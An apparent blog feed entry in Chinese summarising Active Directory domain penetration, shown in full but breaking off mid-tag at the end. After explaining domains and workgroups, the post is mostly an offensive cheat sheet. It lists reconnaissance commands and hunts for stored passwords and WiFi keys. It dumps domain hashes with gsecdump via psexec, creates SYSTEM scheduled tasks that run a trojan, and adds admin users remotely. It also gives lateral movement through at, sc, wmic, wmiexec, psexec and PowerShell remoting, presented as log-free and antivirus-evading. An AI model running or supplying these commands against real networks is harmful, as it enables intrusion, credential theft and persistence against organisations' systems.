<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>13l00m&#39;World</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://13l00m.github.io/"/>
  <updated>2020-03-09T14:02:38.648Z</updated>
  <id>https://13l00m.github.io/</id>
  
  <author>
    <name>13l00m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透总结</title>
    <link href="https://13l00m.github.io/2020/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://13l00m.github.io/2020/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</id>
    <published>2020-03-09T14:01:06.000Z</published>
    <updated>2020-03-09T14:02:38.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网和域"><a href="#内网和域" class="headerlink" title="内网和域"></a>内网和域</h1><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p><p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p><p>域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p><p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p><ul><li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 – 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 – 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li></ul><blockquote><p>域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系</p></blockquote><h2 id="域、工作组、家庭组"><a href="#域、工作组、家庭组" class="headerlink" title="域、工作组、家庭组"></a>域、工作组、家庭组</h2><p><strong>工作组:</strong></p><ul><li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li><li>通常情况下，计算机的数量不超过二十台。</li><li>工作组不受密码保护。</li><li>所有的计算机必须在同一本地网络或子网中。</li></ul><p><strong>家庭组：</strong></p><ul><li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li><li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li></ul><p><strong>域：</strong></p><ul><li>有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。</li><li>如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。 由于网络管理员经常要确保计算机之间的一致性，所以，您也许只能对计算机的设置进行有限制地更改。</li><li>一个域中可以有几千台计算机。</li><li>计算机可以位于不同的本地网络中。</li></ul><hr><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><p>若直线攻击难以奏效，可以进行迂回进攻，从网络为突破，以受限用户权限开始，分析网络结构，制定对应的攻击方案，获取目标的域管理账户，逐步掌控整个网络。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>参见:<a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">内网渗透命令大全</a>:<a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-39285.html</a></p><h3 id="Net基本命令"><a href="#Net基本命令" class="headerlink" title="Net基本命令"></a>Net基本命令</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>echo %PROCESSOR_ARCHITECTURE%</code></td><td align="left">查看系统版本位数</td></tr><tr><td align="left"><code>set</code></td><td align="left">查看系统环境变量</td></tr><tr><td align="left"><code>netstat -ano</code></td><td align="left">查看开放的端口</td></tr><tr><td align="left">`netstat -an</td><td align="left">find “3389”`</td></tr><tr><td align="left"><code>ipconfig /all</code></td><td align="left">查询本机IP段，所在域等</td></tr><tr><td align="left"><code>net config Workstation</code></td><td align="left">当前计算机名，全名，用户名，系统版本，工作站域，登陆域</td></tr><tr><td align="left"><code>net user</code></td><td align="left">本机用户列表</td></tr><tr><td align="left"><code>net localhroup administrators</code></td><td align="left">本机管理员[通常含有域用户]</td></tr><tr><td align="left"><code>net user /domain</code></td><td align="left">查询域用户</td></tr><tr><td align="left"><code>net user 用户名 /domain</code></td><td align="left">获取指定用户的账户信息</td></tr><tr><td align="left"><code>net user /domain b404 pass</code></td><td align="left">修改域内用户密码，需要管理员权限</td></tr><tr><td align="left"><code>net group /domain</code></td><td align="left">查询域里面的工作组</td></tr><tr><td align="left"><code>net group 组名 /domain</code></td><td align="left">查询域中的某工作组</td></tr><tr><td align="left"><code>net group &quot;domain admins&quot; /domain</code></td><td align="left">查询域管理员列表</td></tr><tr><td align="left"><code>net group &quot;enterprise admins&quot; /domain</code></td><td align="left">获得企业管理员列表</td></tr><tr><td align="left"><code>net group 组名 /del /domain</code></td><td align="left">删除域中的某组</td></tr><tr><td align="left"><code>net group 组名 组成员名 /del /domain</code></td><td align="left">删除域中的某组的组成员</td></tr><tr><td align="left"><code>net localgroup administrators /domain</code></td><td align="left">登录本机的域管理员</td></tr><tr><td align="left"><code>net group 组名 /add</code></td><td align="left">增加域中的组</td></tr><tr><td align="left"><code>net localgroup administrators workgroup\user001 /add</code></td><td align="left">域用户添加到本机</td></tr><tr><td align="left"><code>net group &quot;domain controllers&quot; /domain</code></td><td align="left">查看域控制器(如果有多台)</td></tr><tr><td align="left"><code>net time /domain</code></td><td align="left">判断主域，主域服务器都做时间服务器</td></tr><tr><td align="left"><code>net config workstation</code></td><td align="left">当前登录域</td></tr><tr><td align="left"><code>net session</code></td><td align="left">查看当前会话</td></tr><tr><td align="left"><code>net use \\ip\ipc$ pawword /user:username@domain</code></td><td align="left">建立IPC会话[空连接-***]</td></tr><tr><td align="left"><code>net view \\ip</code></td><td align="left">查询某IP共享</td></tr><tr><td align="left"><code>net use z: \\192.168.200.21\文件夹名</code></td><td align="left">建立映射到本机Z盘</td></tr><tr><td align="left"><code>net share</code></td><td align="left">查看SMB指向的路径[即共享]</td></tr><tr><td align="left"><code>at \\192.168.200.21:50 c:\windows\fuxk.exe</code></td><td align="left">在共享主机上执行</td></tr><tr><td align="left"><code>net view</code></td><td align="left">查询同一域内机器列表</td></tr><tr><td align="left"><code>net view /domain</code></td><td align="left">查询域列表</td></tr><tr><td align="left"><code>net view /domain:test</code></td><td align="left">查看test域中计算机列表</td></tr><tr><td align="left"><code>net view \\DC的机器名字</code></td><td align="left">查看域控共享情况</td></tr><tr><td align="left"><code>nltest /domain_trusts</code></td><td align="left">获取域信任信息</td></tr><tr><td align="left"><code>net session</code></td><td align="left">查看当前会话</td></tr><tr><td align="left"><code>net start</code></td><td align="left">查看当前运行的服务</td></tr><tr><td align="left"><code>net time /domain</code></td><td align="left">查询主域服务器的时间</td></tr><tr><td align="left"><code>net time \\192.168.200.21</code></td><td align="left">查看192.168.200.21机器的时间</td></tr><tr><td align="left"><code>echo %logonserver%</code></td><td align="left">查看登陆到这台服务器的计算机</td></tr><tr><td align="left"><code>net accounts</code></td><td align="left">查看本地密码策略</td></tr><tr><td align="left"><code>net accounts /domain</code></td><td align="left">查看域密码策略</td></tr><tr><td align="left"><code>nbtstat –A ip</code></td><td align="left">netbios 查询</td></tr><tr><td align="left"><code>netstat –an/ano/anb</code></td><td align="left">网络连接查询</td></tr><tr><td align="left"><code>netsh firewall show config</code></td><td align="left">查看防火墙策略</td></tr><tr><td align="left"><code>netsh firewall show state</code></td><td align="left">查看防火墙策略</td></tr><tr><td align="left"><code>route print</code></td><td align="left">路由表</td></tr><tr><td align="left"><code>tracert IP</code></td><td align="left">路由跟踪</td></tr><tr><td align="left"><code>arp -a</code></td><td align="left">列出本网段内所有活跃的IP地址</td></tr><tr><td align="left"><code>arp -s (ip + mac)</code></td><td align="left">绑定mac和IP</td></tr><tr><td align="left"><code>arp -d (iP + mac)</code></td><td align="left">解绑IP和Mac</td></tr><tr><td align="left"><code>tasklist /V</code></td><td align="left">查看进程[显示对应用户]</td></tr><tr><td align="left"><code>tasklist /S ip /U domain\username /P /V</code></td><td align="left">查看远程计算机进程列表</td></tr><tr><td align="left"><code>psexec \\192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u</code></td><td align="left">从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td></tr><tr><td align="left"><code>gsecdump -a</code></td><td align="left">获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td></tr><tr><td align="left"><code>tasklist /S IP地址 /U 域名\用户名 /P /V</code></td><td align="left">查看远程计算机进程</td></tr><tr><td align="left"><code>tasklist /svc</code></td><td align="left">查看进程</td></tr><tr><td align="left"><code>taskkill /im 进程名称(cmd.exe)</code></td><td align="left">结束进程</td></tr><tr><td align="left"><code>taskkill /pid[进程码]</code></td><td align="left"><code>-t(结束该进程)</code> <code>-f(强制结束该进程以及所有子进程)</code></td></tr><tr><td align="left"><code>ping 主机名</code></td><td align="left">显示IP</td></tr><tr><td align="left"><code>qprocess *</code></td><td align="left">类似tasklist</td></tr><tr><td align="left"><code>qprocess /SERVER:IP</code></td><td align="left">远程查看计算机进程列表</td></tr><tr><td align="left"><code>nslookup –qt-MX Yahoo.com</code></td><td align="left">查看邮件服务器</td></tr><tr><td align="left"><code>whoami /all</code></td><td align="left">查询当前用户权限等</td></tr><tr><td align="left"><code>set</code></td><td align="left">查看系统环境变量</td></tr><tr><td align="left"><code>systeminfo</code></td><td align="left">查看系统信息</td></tr><tr><td align="left"><code>qwinsta</code></td><td align="left">查看登录情况</td></tr><tr><td align="left"><code>qwinsta /SERVER:IP</code></td><td align="left">查看远程登录情况</td></tr><tr><td align="left"><code>fsutil fsinfo drives</code></td><td align="left">查看所有盘符</td></tr><tr><td align="left"><code>gpupdate /force</code></td><td align="left">更新域策略</td></tr><tr><td align="left"><code>whoami</code></td><td align="left">查询账号所属权限</td></tr><tr><td align="left"><code>whoami /all</code></td><td align="left">查看sid号</td></tr><tr><td align="left"><code>wmic bios</code></td><td align="left">查看bios信息</td></tr><tr><td align="left"><code>wmic qfe</code></td><td align="left">查看补丁信息</td></tr><tr><td align="left"><code>wmic qfe get hotfixid</code></td><td align="left">查看补丁-Patch号，很实用</td></tr><tr><td align="left"><code>wmic qfe list full /format:htable &gt; hotfixes.htm</code></td><td align="left">详细的补丁安装</td></tr><tr><td align="left"><code>wmic share get name,path</code></td><td align="left">查看SMB指向路径</td></tr><tr><td align="left"><code>wmic startup</code></td><td align="left">查看启动项</td></tr><tr><td align="left"><code>wmic service</code></td><td align="left">查看服务</td></tr><tr><td align="left"><code>wmic os</code></td><td align="left">查看OS信息</td></tr><tr><td align="left"><code>wmic service list brief</code></td><td align="left">查看进程服务</td></tr><tr><td align="left"><code>wmic process list brief</code></td><td align="left">查看进程</td></tr><tr><td align="left"><code>wmic startup list brief</code></td><td align="left">启动程序信息</td></tr><tr><td align="left"><code>wmic product list brief</code></td><td align="left">查看安装程序和版本信息（漏洞利用线索）</td></tr><tr><td align="left"><code>wmic startup list full</code></td><td align="left">识别开机启动的程序</td></tr><tr><td align="left"><code>wmic process where(description=&quot;mysqld.exe&quot;)&gt;&gt;mysql.log</code></td><td align="left">获取软件安装路径</td></tr><tr><td align="left"><code>dir \\DC\SYSVOL /s /a &gt; sysvol.txt</code></td><td align="left">列出sysvol日志记录</td></tr><tr><td align="left"><code>xcopy \\dc2.b404.com\sysvol.txt sysvol.txt /i /e /c</code></td><td align="left">拷贝sysvol.txt到本地</td></tr><tr><td align="left"><code>REG query HKCU /v &quot;pwd&quot; /s</code></td><td align="left">获取到存到注册表中的密码</td></tr><tr><td align="left"><code>dir /b/s config.*</code></td><td align="left">查看所在目录所有前缀为config的文件</td></tr><tr><td align="left"><code>findstr /si password *.xml *.ini *.txt</code></td><td align="left">查看后缀名文件中含有password关键字的文件</td></tr><tr><td align="left"><code>findstr /si login *.xml *.ini *.txt</code></td><td align="left">查看后缀名文件中含有login关键字的文件</td></tr><tr><td align="left"><code>copy con ftp.bat</code></td><td align="left">创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td></tr><tr><td align="left"><code>copy con test.vbs</code></td><td align="left">创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td></tr></tbody></table><h3 id="dsquery的AD查询工具"><a href="#dsquery的AD查询工具" class="headerlink" title="dsquery的AD查询工具"></a>dsquery的AD查询工具</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</code></td><td align="left">列出该域内所有用户名</td></tr><tr><td align="left">`dsquery server -domain super.com</td><td align="left">dsget server -dnsname -site`</td></tr><tr><td align="left"><code>dsquery contact</code></td><td align="left">寻找目录中的联系人</td></tr><tr><td align="left"><code>dsquery subnet</code></td><td align="left">列出该域内网段划分</td></tr><tr><td align="left"><code>query user</code></td><td align="left">查询那些用户在线</td></tr><tr><td align="left"><code>dsquery group &amp;&amp; net group /domain</code></td><td align="left">列出该域内分组</td></tr><tr><td align="left"><code>dsquery ou</code></td><td align="left">列出该域内组织单位</td></tr><tr><td align="left"><code>dsquery server &amp;&amp; net time /domain</code></td><td align="left">列出该域内域控制器</td></tr><tr><td align="left"><code>dsquery site -o rdn</code></td><td align="left">搜索域中所有站点的名称</td></tr><tr><td align="left">`dsquery group dc=super,dc=com</td><td align="left">more`</td></tr><tr><td align="left"><code>psloggedon.exe</code></td><td align="left">查询那台主机和用户登录到该主机上</td></tr><tr><td align="left"><code>netsess.exe //192.168.1.115</code></td><td align="left">远程主机上无需管理员权限,查询到主机名和用户</td></tr><tr><td align="left"><code>reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT&quot;</code></td><td align="left">获取最近mstsc登录的记录</td></tr></tbody></table><h3 id="DOS常用命令"><a href="#DOS常用命令" class="headerlink" title="DOS常用命令"></a>DOS常用命令</h3><table><thead><tr><th align="left">命令</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">mspaint</td><td align="left">画图工具</td></tr><tr><td align="left">calc</td><td align="left">计算器</td></tr><tr><td align="left">notepad</td><td align="left">记事本</td></tr><tr><td align="left">taskmgr</td><td align="left">任务管理器</td></tr><tr><td align="left">osk</td><td align="left">打开屏幕键盘</td></tr><tr><td align="left">gpedit.msc</td><td align="left">组策略</td></tr><tr><td align="left">services.msc</td><td align="left">本地服务</td></tr><tr><td align="left">compmgmt.msc</td><td align="left">计算机管理</td></tr><tr><td align="left">devmgmt.msc</td><td align="left">设备管理器</td></tr><tr><td align="left">winver</td><td align="left">查看系统版本</td></tr><tr><td align="left">magnify</td><td align="left">放大镜实用程序</td></tr><tr><td align="left">eventvwr</td><td align="left">事件查看器</td></tr><tr><td align="left">Regedit</td><td align="left">打开注册表</td></tr><tr><td align="left">resmon</td><td align="left">资源监视器</td></tr><tr><td align="left">WMIC BIOS get releasedate</td><td align="left">查看电脑生产日期</td></tr><tr><td align="left">mstsc -f</td><td align="left">远程连接（可以全屏）</td></tr></tbody></table><h3 id="长命令"><a href="#长命令" class="headerlink" title="长命令"></a>长命令</h3><p>一键获取WiFI密码：**</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo%j | findstr -i -v echo | netsh wlan show profiles %jkey=clear</span><br></pre></td></tr></table></figure><p>copy</p><p>查看是否支持PowerShell：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if defined PSModulePath (echo support powershell) else (echo not support powershell)</span><br></pre></td></tr></table></figure><p>copy</p><p>添加任务计划：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks.exe  /Create /RU&quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/12/31</span><br></pre></td></tr></table></figure><p>copy</p><p>nbtscan扫描整个网络:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nbtscan -r 192.168.200.0/24</span><br></pre></td></tr></table></figure><p>copy</p><p>ping 扫描内网存活主机：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br></pre></td></tr></table></figure><p>copy</p><p>域机器对应的IP:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR /F &quot;eol=- tokens=1 delims=\ &quot; %a IN(&apos;net view&apos;) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 | find /i &quot;ttl&quot; &amp; echo.)</span><br></pre></td></tr></table></figure><p>copy</p><p>找主机名：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping -a 192.168.200.%i -w 1 -n 1 | find /i &quot;Pinging&quot;</span><br></pre></td></tr></table></figure><p>copy</p><p>找B段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot;</span><br></pre></td></tr></table></figure><p>copy</p><blockquote><p>将<code>Pinging</code>改成<code>Ping</code>就可以适用于Win7</p></blockquote><h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><h4 id="at（系统权限）"><a href="#at（系统权限）" class="headerlink" title="at（系统权限）"></a>at（系统权限）</h4><p>利用计划任务<code>at</code>命令，常用的方法（<strong>系统权限</strong>）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net timeat \\127.0.0.1 23:00 c:\winnt\system32/viliosn.exeat \\127.0.0.1 1 delete /yes #删除本机1号任务</span><br></pre></td></tr></table></figure><p>copy</p><h4 id="schtasks-用户权限和系统权限都可以"><a href="#schtasks-用户权限和系统权限都可以" class="headerlink" title="schtasks(用户权限和系统权限都可以)"></a>schtasks(用户权限和系统权限都可以)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn asp_net /tr &quot;c:\windows\system32\cmd.exe /c cmd&quot; /sc once /st 00:00 /S ip /RU System /u user /p passwordschtasks /run /tn asp_net /S ip /u user /p passwordschtasks /F /delete /tn asp_net /S ip /u user /p password</span><br></pre></td></tr></table></figure><p>copy</p><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><h5 id="系统权限的sc用法"><a href="#系统权限的sc用法" class="headerlink" title="系统权限的sc用法"></a>系统权限的sc用法</h5><p>利用服务工具，指定<strong>用户权限启动</strong></p><p>在<code>192.130.16.22</code>上创建一个xxoox的服务，程序执行命令为<code>cmd.exe /c start c:\programdata\a+.bat</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.130.16.22 create xxoox binPath= &quot;cmd.exe /c start c:\programdata\a+.bat&quot;</span><br></pre></td></tr></table></figure><p>copy</p><p>执行xxoox的服务，执行成功可能会提示错误1053，不宜作为启动项，一般用用户权限也是临时的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.130.16.22 start xxooxsc \\192.130.16.22 delete xxoox</span><br></pre></td></tr></table></figure><p>copy</p><h5 id="指定用户权限启动的用法"><a href="#指定用户权限启动的用法" class="headerlink" title="指定用户权限启动的用法"></a>指定用户权限启动的用法</h5><p>在<code>192.130.16.22</code>上指定<code>administrator</code>账户创建一个<code>adminsec</code>服务：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.130.16.22 create adminsec binpath = “c:\pass.exe” obj= “adminsec\administrator” passwrod= adminsecsc \\192.130.16.22 start adminsec</span><br></pre></td></tr></table></figure><p>copy</p><h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于1. 管理本地或远程的 Windows 系统。当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。越来越多的APT事件中也出现了WMI攻击的影子，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。(奇淫技巧可见<a href="http://2014.hackitoergosum.org/slides/day1_WMI_Shell_Andrei_Dumitrescu.pdf" target="_blank" rel="noopener">wmi shell</a>)</p><p>常见的WMI攻击工具：</p><ul><li><code>PTH-WMIS (最早wmi攻击的工具，单条命令执行，无回显，需要pth-smbget配合读取结果)</code></li><li><code>impackets wmiexec(Linux跨window经常用)</code></li><li><code>wmiexec.vbs (国人制造 为了回显会写文件)</code></li><li><code>Invoke-WmiCommand&amp;Invoke-PowerShellWmi</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#在远程系统上执行 bat 脚本wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create c:\programdata\test.bat###在远程系统上执行单条命令wmic /node:192.168.17.138 /user:test /password:!@#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add#在远程系统上运行exe文件C:\Users\DC&gt;wmic /node:192.168.200.20 /user:web\administrator /password:Web12345 process call create &quot;cmd.exe /c calc.exe&quot;</span><br></pre></td></tr></table></figure><p>copy</p><p><strong>工具说明:</strong></p><ol><li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li><li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>wmic 会以管理员权限在远程系统上执行命令</li><li>防火墙开启将无法连接</li><li>如果报错 “Invalid Global Switch” ，用双引号把包含<code>-</code>的结点括起来即可正常执行。</li></ol><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/远程代码执行/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png" alt="img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/远程代码执行/post/92aa573b-2e90-4248-88c5-dd23cb48ae5b.png" target="_blank" rel="noopener">img</a></p><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎 WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。</p><p><strong>常用命令:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###获取半交互式shellcscript.exe //nologo wmiexec.vbs /shell 192.168.17.138 test !@#123QWE###在远程系统上执行单条命令cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE &quot;cmdkey /list&quot;###在远程系统上执行 bat 脚本cscript.exe wmiexec.vbs /cmd 192.168.17.138 test !@#123QWE c:\programdata\test.bat</span><br></pre></td></tr></table></figure><p>copy</p><p><em>其它参数:</em></p><ul><li><code>-wait5000</code> 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。</li><li><code>-persist</code> 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。</li></ul><p>下面这段代码在脚本的一开始，是控制结果文件路径、文件名、以及默认代码执行时间的，可以自行更改。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Const Path = &quot;C:\&quot; Const FileName = &quot;wmi.dll&quot; Const timeOut = 1200</span><br></pre></td></tr></table></figure><p>copy</p><p><strong>工具说明:</strong></p><ul><li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li><li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>wmicexec.vbs 会以管理员权限在远程系统上执行命令</li><li>virustotal 显示 wmiexec.vbs 会被 Kaspersky、Symantec 和 ZoneAlarm 查杀。</li></ul><h4 id="impackets-wmiexec"><a href="#impackets-wmiexec" class="headerlink" title="impackets wmiexec"></a>impackets wmiexec</h4><p>使用impackets wmiexec执行命令测试，执行命令可以回显。在Linux跨window渗透时候经常使用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#登陆远程机器python wmiexec.py administrator:Web12345@192.168.63.150</span><br></pre></td></tr></table></figure><p>copy</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/远程代码执行/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg" alt="img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg)" title>                </div>                <div class="image-caption">img](https://b404.xyz/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg)</div>            </figure></p><p><a href="https://b404.xyz/img/hack/远程代码执行/post/1d54a2c2-f7f9-4a3d-9464-953618fe1581.jpg" target="_blank" rel="noopener">img</a></p><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p><em>常用命令</em></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">###获取管理员用户权限的交互式 shellpsexec \\192.168.17.138 -u Administrator -p !@#123QWE cmd###获取普通用户权限的交互式 shell，原因参见 LocalAccountTokenFilterPolicy,要想获取管理员权限 shell ，需要添加 -h 参数。psexec \\192.168.17.138 -u test -p !@#123QWE cmd###在远程系统上以 system 权限执行单条命令，有时回显只有一行，原因尚不清楚。psexec \\192.168.17.138 -u Administrator -p !@#123QWE -s cmd /c &quot;quser&quot;###在远程系统上执行 bat 脚本psexec \\192.168.17.138 -u Administrator -p !@#123QWE c:\programdata\test.bat###拷贝文件到远程机器并以交互方式运行，运行结束后会删除psexec \\192.168.17.138 -c C:\Users\test\Desktop\GetHashes.exe</span><br></pre></td></tr></table></figure><p>copy</p><p><em>其它参数</em></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–accepteula 第一次运行会弹框,输入这个参数便不会弹框-s 以 “nt authority\system” 权限运行远程进程-h 如果可以，以管理员权限运行远程进程-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项\\ip 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令</span><br></pre></td></tr></table></figure><p>copy</p><p><em>工具说明</em></p><ul><li>需要远程系统开启 ADMIN$ 共享</li><li>建立 ipc 连接后可以不指定用户名和密码</li><li>不能仅拷贝文件不执行，只需要拷贝时可以建立 ipc 连接后c opy</li><li>在启动psExec建立连接之后，远程系统上会被安装一个服务：PSEXESVC。安装服务会留下日志，而且psexec退出时有可能服务删除失败，所以不推荐使用 psexec。</li></ul><h4 id="PsRemoting"><a href="#PsRemoting" class="headerlink" title="PsRemoting"></a>PsRemoting</h4><p>PowerShell远程命令执行基于WinRM。WinRM指的是Windows远程管理服务，它会监听HTTP(5985)、HTTPS(5986)，不过此服务除了Windows Server 2012及R2默认启用外，其他默认都是禁用的。管理员为了方便对服务器的远程管理，也许将此端口开启，这种事就像内网弱口令一样，做渗透嘛，什么奇迹都有可能发生。</p><p>利用PowerShell渗透可以绕过杀软、绕过白名单防护设备，并且还可以得到返回的数据，简直是杀人越货神器。默认禁用PS。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#先开启执行策略set-executionpolicy unrestricted#在目标机器上开启ps远程功能enable-psremoting#开启远程连接Enter-PSSession 192.168.200.20 -Credential  administrator</span><br></pre></td></tr></table></figure><p>copy</p><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://b404.xyz/img/hack/远程代码执行/post/5f86bde0-3bdb-4c2e-995e-dc1e80ffbbd0.png" 